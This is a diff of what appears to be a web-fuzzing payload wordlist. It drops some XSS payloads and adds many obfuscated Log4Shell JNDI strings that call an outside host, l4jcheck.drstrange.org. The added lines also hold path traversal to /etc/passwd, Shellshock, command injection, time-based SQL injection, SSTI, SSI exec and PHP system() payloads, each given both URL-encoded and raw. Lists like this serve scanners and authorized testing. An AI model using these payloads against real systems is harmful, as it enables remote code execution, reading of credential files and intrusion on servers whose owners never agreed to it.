@@ -1,18 +1,199 @@
-%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-name%3Ax%22%20onanimationend%3D%22alert%601%60%22%3E%3C%2Fxss%3E
-<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert`1`"></xss>
-%3Csvg%3E%3Canimate%20onbegin%3Dalert(1)%20attributeName%3Dx%20dur%3D1s%3E
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-%3Csvg%3E%3Canimate%20onend%3Dconsole.log(1)%20attributeName%3Dx%20dur%3D1s%3E
-<svg><animate onend=console.log(1) attributeName=x dur=1s>
-%3Cdetails%20ontoggle%3Dwindow.alert(1)%20open%3Etest%3C%2Fdetails%3E
-<details ontoggle=window.alert(1) open>test</details>
-%3Cstyle%3E%40keyframes%20slidein%20%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22%20onwebkitanimationiteration%3D%22alert(1)%22%3E%3C%2Fxss%3E
-<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
-%3CIMG%20SRC%3Dx%20onerror%3D%22alert(String.fromCharCode(88%2C83%2C83))%22%3E
-<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
-%3Ciframe%20%20src%3D%22%26Tab%3Bjavascript%3Aprompt(1)%26Tab%3B%22%3E
-<iframe  src="&Tab;javascript:prompt(1)&Tab;">
-%3Ciframe%20%20src%3D%22javascript%3Aprompt(1)%22%3E
-<iframe  src="javascript:prompt(1)">
-%3Cimg%20src%3D%60xx%3Axx%60onerror%3Dalert(1)%3E
-<img src=`xx:xx`onerror=alert(1)>
+%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2F%7B%7Bl4jcheck.drstrange.org%7D%7D%2F314445%7D%2C
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{l4jcheck.drstrange.org}}/314445},
+%24%7B%24%7B%3A%3A-j%7Dndi%3Armi%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${::-j}ndi:rmi://l4jcheck.drstrange.org/314445},
+%24%7Bjndi%3Armi%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${jndi:rmi://l4jcheck.drstrange.org/314445},
+%24%7Bjndi%3Armi%3A%2F%2Fl4jcheck.drstrange.org%7D%2F%2C
+${jndi:rmi://l4jcheck.drstrange.org}/,
+%24%7B%24%7Blower%3Ajndi%7D%3A%24%7Blower%3Armi%7D%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${lower:jndi}:${lower:rmi}://l4jcheck.drstrange.org/314445},
+%24%7B%24%7Blower%3A%24%7Blower%3Ajndi%7D%7D%3A%24%7Blower%3Armi%7D%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${lower:${lower:jndi}}:${lower:rmi}://l4jcheck.drstrange.org/314445},
+%24%7B%24%7Blower%3Aj%7D%24%7Blower%3An%7D%24%7Blower%3Ad%7Di%3A%24%7Blower%3Armi%7D%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://l4jcheck.drstrange.org/314445},
+%24%7B%24%7Blower%3Aj%7D%24%7Bupper%3An%7D%24%7Blower%3Ad%7D%24%7Bupper%3Ai%7D%3A%24%7Blower%3Ar%7Dm%24%7Blower%3Ai%7D%7D%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://l4jcheck.drstrange.org/314445},
+%24%7Bjndi%3Adns%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${jndi:dns://l4jcheck.drstrange.org/314445},
+%24%7Bjnd%24%7B123%2525ff%3A-%24%7B123%2525ff%3A-i%3A%7D%7Dldap%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${jnd${123%25ff:-${123%25ff:-i:}}ldap://l4jcheck.drstrange.org/314445},
+%24%7Bjndi%3Adns%3A%2F%2Fl4jcheck.drstrange.org%7D%2C
+${jndi:dns://l4jcheck.drstrange.org},
+%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%3Aldap%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${j${k8s:k5:-ND}i:ldap://l4jcheck.drstrange.org/314445},
+%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%3Aldap%24%7Bsd%3Ak5%3A-%3A%7D%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%24%7Bsd%3Ak5%3A-%3A%7Dldap%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap://l4jcheck.drstrange.org/314445},
+%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%24%7Bsd%3Ak5%3A-%3A%7Dldap%24%7Bsd%3Ak5%3A-%3A%7D%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+%24%7B%24%7Bk8s%3Ak5%3A-J%7D%24%7Bk8s%3Ak5%3A-ND%7Di%24%7Bsd%3Ak5%3A-%3A%7Dldap%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://l4jcheck.drstrange.org/314445},
+%24%7B%24%7Bk8s%3Ak5%3A-J%7D%24%7Bk8s%3Ak5%3A-ND%7Di%24%7Bsd%3Ak5%3A-%3A%7Dldap%7Bsd%3Ak5%3A-%3A%7D%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//l4jcheck.drstrange.org/314445},
+%24%7B%24%7Bk8s%3Ak5%3A-J%7D%24%7Bk8s%3Ak5%3A-ND%7Di%24%7Bsd%3Ak5%3A-%3A%7Dl%24%7Blower%3AD%7Dap%24%7Bsd%3Ak5%3A-%3A%7D%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%24%7Bsd%3Ak5%3A-%3A%7D%24%7Blower%3AL%7Ddap%24%7Bsd%3Ak5%3A-%3A%7D%2F%2Fl4jcheck.drstrange.org%2F314445%2C
+${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//l4jcheck.drstrange.org/314445,
+%24%7B%24%7Bk8s%3Ak5%3A-J%7D%24%7Bk8s%3Ak5%3A-ND%7Di%24%7Bsd%3Ak5%3A-%3A%7Dl%24%7Blower%3AD%7Da%24%7B%3A%3A-p%7D%24%7Bsd%3Ak5%3A-%3A%7D%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fl4jcheck.drstrange.org%7D%2C
+${jndi:${lower:l}${lower:d}a${lower:p}://l4jcheck.drstrange.org},
+%24%7Bjnd%24%7Bupper%3Ai%7D%3Aldap%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D%2C
+${jnd${upper:i}:ldap://l4jcheck.drstrange.org/314445},
+%24%7Bj%24%7B%24%7B%3A-l%7D%24%7B%3A-o%7D%24%7B%3A-w%7D%24%7B%3A-e%7D%24%7B%3A-r%7D%3An%7Ddi%3Aldap%3A%2F%2Fl4jcheck.drstrange.org%2F314445%7D
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://l4jcheck.drstrange.org/314445}
+.%5E%2C%2F%3C%3E'%22
+.^,/<>'"
+%3B'
+;'
+%23
+#
+%5C
+\
+%24%7B
+${
+*
+%2F*
+/*
+%2F%2F
+//
+%3F
+?
+%40
+@
+toString
+__proto__
+length
+prototype
+--help
+--version
+%24PATH
+$PATH
+'%24PATH
+'$PATH
+%22%24PATH
+"$PATH
+%7Cid%20%23
+|id #
+%60id%60
+`id`
+..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+../../../../../../../etc/passwd
+..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fetc%25252fpasswd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd%2500
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00
+%3Bsleep%204%3B
+;sleep 4;
+%7Csleep%204%23
+|sleep 4#
+%7C%2Fusr%2Fbin%2Fsleep%204%23
+|/usr/bin/sleep 4#
+%7Csleep%204%3B
+|sleep 4;
+%26%20sleep%204%3B
+& sleep 4;
+%3Bsleep%204%7C
+;sleep 4|
+%60sleep%204%60
+`sleep 4`
+%60%2Fusr%2Fbin%2Fsleep%204%60
+`/usr/bin/sleep 4`
+()%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22sleep%204%22
+() { :;}; /bin/bash -c "sleep 4"
+%7CC%3A%5CWindows%5CSystem32%5Ctimeout.exe%204
+|C:\Windows\System32\timeout.exe 4
+%7Ctimeout%204%7C
+|timeout 4|
+%7CC%3A%5CWindows%5CSystem32%5Ctimeout.exe%204%7C
+|C:\Windows\System32\timeout.exe 4|
+%7Ctimeout%204%3B
+|timeout 4;
+%3Bsystem('timeout%204')
+;system('timeout 4')
+%3Bsystem('C%3A%5CWindows%5CSystem32%5Ctimeout.exe%204')
+;system('C:\Windows\System32\timeout.exe 4')
+%26%26%20FOR%20%2FF%20%22delims%3D%22%20%25i%20IN%20('timeout%204')%20DO%20echo%201
+&& FOR /F "delims=" %i IN ('timeout 4') DO echo 1
+%3BStart-Sleep%20-s%204%3B
+;Start-Sleep -s 4;
+%3BStart-Sleep%20-s%204%23
+;Start-Sleep -s 4#
+%7CStart-Sleep%20-s%204%7C
+|Start-Sleep -s 4|
+%7CStart-Sleep%20-s%204%3B
+|Start-Sleep -s 4;
+%3BStart-Sleep%20-s%204%7C
+;Start-Sleep -s 4|
+%3Bsystem('Start-Sleep%20-s%204')
+;system('Start-Sleep -s 4')
+%250AStart-Sleep%20-s%204%250A
+%0AStart-Sleep -s 4%0A
+%250a%20Start-Sleep%20-s%204%20%250a
+%0a Start-Sleep -s 4 %0a
+sleep(4)%23
+sleep(4)#
+1%20or%20sleep(4)%23
+1 or sleep(4)#
+%22%20or%20sleep(4)%23
+" or sleep(4)#
+'%20or%20sleep(4)%23
+' or sleep(4)#
+%22%20or%20sleep(4)%3D%22
+" or sleep(4)="
+'%20or%20sleep(4)%3D'
+' or sleep(4)='
+1)%20or%20sleep(4)%23
+1) or sleep(4)#
+%22)%20or%20sleep(4)%3D%22
+") or sleep(4)="
+')%20or%20sleep(4)%3D'
+') or sleep(4)='
+1))%20or%20sleep(4)%23
+1)) or sleep(4)#
+%22))%20or%20sleep(4)%3D%22
+")) or sleep(4)="
+'))%20or%20sleep(4)%3D'
+')) or sleep(4)='
+%3Bwaitfor%20delay%20'0%3A0%3A4'--
+;waitfor delay '0:0:4'--
+)%3Bwaitfor%20delay%20'0%3A0%3A4'--
+);waitfor delay '0:0:4'--
+'%3Bwaitfor%20delay%20'0%3A0%3A4'--
+';waitfor delay '0:0:4'--
+%22%3Bwaitfor%20delay%20'0%3A0%3A4'--
+";waitfor delay '0:0:4'--
+')%3Bwaitfor%20delay%20'0%3A0%3A4'--
+');waitfor delay '0:0:4'--
+%22)%3Bwaitfor%20delay%20'0%3A0%3A4'--
+");waitfor delay '0:0:4'--
+))%3Bwaitfor%20delay%20'0%3A0%3A4'--
+));waitfor delay '0:0:4'--
+'))%3Bwaitfor%20delay%20'0%3A0%3A4'--
+'));waitfor delay '0:0:4'--
+%22))%3Bwaitfor%20delay%20'0%3A0%3A4'--
+"));waitfor delay '0:0:4'--
+%24(%60cat%20%2Fetc%2Fpasswd%60)
+$(`cat /etc/passwd`)
+%7Ccat%20%2Fetc%2Fpasswd
+|cat /etc/passwd
+%3Bcat%20%2Fetc%2Fpasswd%23
+;cat /etc/passwd#
+%3Bcat%20%2Fetc%2Fpasswd
+;cat /etc/passwd
+%250Acat%2520%2Fetc%2Fpasswd
+%0Acat%20/etc/passwd
+%7B%7B%20get_user_file(%22%2Fetc%2Fpasswd%22)%20%7D%7D
+{{ get_user_file("/etc/passwd") }}
+%3C!--%23exec%20cmd%3D%22%2Fbin%2Fcat%20%2Fetc%2Fpasswd%22--%3E
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+system('cat%20%2Fetc%2Fpasswd')%3B
+system('cat /etc/passwd');
+%3C%3Fphp%20system(%22cat%20%2Fetc%2Fpasswd%22)%3B%3F%3E
+<?php system("cat /etc/passwd");?>
+%3Bsystem('cat%2520%2Fetc%2Fpasswd')
+;system('cat%20/etc/passwd')
+%26lt%3B!--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
